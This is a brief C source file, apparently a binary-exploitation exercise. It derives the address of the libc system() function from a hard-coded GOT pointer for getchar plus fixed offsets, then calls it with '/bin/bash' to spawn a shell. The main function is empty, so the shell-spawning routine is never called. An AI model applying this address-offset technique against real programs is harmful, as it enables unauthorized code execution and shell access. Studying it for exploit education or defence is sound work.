#include "stdio.h"

typedef void(*fsystem)(const char*);
typedef int(*fgetchar)();

void work(){
	char s[] = "/bin/bash";
	fsystem f = (fsystem)(*(fgetchar*)0x804A00 + 0x0003f250 - 0x00069860);
	f(s);
}

int main(){
}
